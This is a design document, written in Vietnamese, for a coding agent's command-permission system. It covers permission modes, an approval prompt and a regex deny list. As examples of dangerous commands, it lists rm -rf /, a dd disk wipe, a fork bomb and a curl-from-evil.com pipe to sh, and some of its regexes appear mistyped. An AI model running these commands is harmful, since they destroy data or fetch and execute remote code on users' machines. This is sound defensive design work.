# P0.1 — Permission & Safety System

## Mục tiêu

Ngăn agent vô tình hoặc cố ý chạy lệnh nguy hiểm trên máy người dùng. Mặc định giữ hành vi hiện tại (autonomous) để backward compatible; thêm cơ chế cho phép người dùng chủ động bật chế độ an toàn.

## Phân tích vấn đề

`run_command` hiện tại trong `tools.ts:toolRunCommand` dùng `execFileSync("/bin/sh", ["-c", command])` — chạy **bất kỳ lệnh nào** không hỏi. Các lệnh nguy hiểm:
- `rm -rf /`, `rm -rf $HOME` — xóa toàn bộ hệ thống
- `dd if=/dev/zero of=/dev/sda` — phá disk
- `:(){ :|:& };:` — fork bomb
- `curl http://evil.com | sh` — RCE
- `sudo rm -rf /` — leo quyền

## Thiết kế

### 1. Permission Modes

Thêm vào `AgentConfig`:

```ts
type PermissionMode = "auto" | "ask" | "readonly";
// auto   = chế độ hiện tại, chạy không hỏi (default)
// ask    = hỏi user trước mỗi run_command, trừ lệnh trong allowlist
// readonly = không cho phép run_command (chỉ đọc file)
```

CLI flag: `--permission <mode>` hoặc env `CODER_PERMISSION=ask`.
Alias `-y` (--yes) hiện tại → tương đương `CODER_PERMISSION=auto` (non-interactive = không hỏi).

### 2. Catastrophic Command Deny List

Regex patterns **luôn bị từ chối** bất kể mode nào (hard deny):

```
rm\s+-rf\s+/(?:\*|\s|$)
rm\s+-rf\s+~(?:\s|$)
mkfs
dd\s+.*of=/dev/
:s+\(\)\s*\{.*:.*\|.*:.*\}[;:]
curl\s+.*\|\s*sh
wget\s+.*\|\s*sh
sudo\s+rm\s+-rf
shutdown|reboot|init\s+0|init\s+6
mkfs|parted
>f\s+/dev/
```

→ Trả lỗi cho LLM: `"Command denied by safety policy: <command> matches prohibited pattern"`.

### 3. Allowlist + Denylist (cấu hình được)

Trong `.coderrc.json`:

```json
{
  "permissions": {
    "mode": "ask",
    "allowCommands": ["npm ", "git ", "npx ", "pnpm ", "cargo ", "make ", "go "],
    "denyCommands": ["curl ", "wget ", "pip install ", "gem install "]
  }
}
```

Logic:
1. Nếu command khớp catastrophic deny → **DENY** (không bao giờ hỏi)
2. Nếu command khớp denyCommands → **DENY**
3. Nếu command khớp allowCommands → **ALLOW** (chạy không hỏi)
4. Mode `auto` → **ALLOW** (như hiện tại)
5. Mode `ask` → **ASK** (readline prompt)
6. Mode `readonly` → **DENY**

### 4. Interactive Prompt (mode=ask)

```
⚠  run_command requires approval: npm install express
[y] yes  [a] always allow "npm " (session)  [n] no  [q] quit session: 
```

- `y` = chạy lệnh này lần này
- `a` = thêm prefix `"npm "` vào session allowlist (tự động allow các lệnh npm tiếp theo)
- `n` = từ chối lệnh này, trả kết quả lỗi cho agent
- `q` = abort agent
- Timeout 60s không trả lời → hỏi lại (không auto-deny để không block CI)

Mode `ask` + non-interactive (`-y`) → thay vì hỏi, **deny** command với message: `"Permission denied in non-interactive mode. Use --permission=auto or add to allowCommands."`

### 5. Readonly mode

Mode `readonly` → `run_command` tool luôn trả lỗi. Dùng để preview XEM agent định làm gì trước khi bật full autonomy.

## File changes

| File | Thay đổi |
|---|---|
| `src/permissions.ts` | **NEW** — classifyCommand, PermissionChecker, prompt logic |
| `src/config.ts` | Thêm `permissions.mode`, `permissions.allowCommands`, `permissions.denyCommands` vào AgentConfig + RcFile |
| `src/index.ts` | Thêm `--permission <mode>` flag |
| `src/agent.ts` | Gọi `PermissionChecker` trước khi `tool.run(run_command)` |
| `src/tools.ts` | Thêm `ToolContext.permissions` (hoặc truyền qua Agent.run) |
| `src/ui.ts` | Thêm `confirmPrompt()` — hàm readline đồng bộ |
| `.gitignore` | Thêm dòng `.coderrc.json` comment warning |
| `README.md` | Cập nhật phần config + security |

## Acceptance criteria

1. `coder --permission=ask "npm install lodash"` → hiển thị prompt, user nhập y → chạy bình thường
2. `coder --permission=readonly "rm -rf /"` → trả lỗi "command denied" mà không chạy
3. Catastrophic patterns (`rm -rf /`) bị deny DÙ ở mode auto
4. `coder -y --permission=ask "rm -rf /"` → deny (non-interactive overrides ask)
5. E2E test hiện tại vẫn pass (auto mode mặc định)
6. Typecheck pass, không thêm runtime dependencies
